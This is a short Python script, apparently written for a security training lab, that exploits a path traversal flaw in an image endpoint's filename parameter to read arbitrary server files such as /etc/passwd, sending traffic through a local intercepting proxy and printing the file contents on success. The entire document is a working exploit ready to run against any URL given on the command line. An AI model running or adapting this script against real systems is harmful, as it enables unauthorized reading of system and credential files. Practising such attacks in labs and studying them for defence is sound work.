import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={"http":"http://127.0.0.1:8081","https":"http://127.0.0.1:8081"}

def path_transversal_exploit(url,target_file):
    path=f"/image?filename=/var/www/images/../../../{target_file}"
    r=requests.get(url + path,verify=False,proxies=proxies)
    if "root:x" in r.text:
        print("[+] Exploit Successfull.")
        print(f"The contents of {target_file} is printed.")
        print(r.text)
        sys.exit(0)
    else:
        print("[-] Exploit Failed.")
        sys.exit(-1)
def main():
    if len(sys.argv)!=3:
        print("[+] Usage: %s <url> <target_file>" % sys.argv[0])
        print("[+] Example: %s http://evil.com /etc/passwd" % sys.argv[0])
        sys.exit(-1)
    else:
        url=sys.argv[1].rstrip("/")
        target_file=sys.argv[2].lstrip("/")
        path_transversal_exploit(url,target_file)

if __name__=="__main__":
    main()


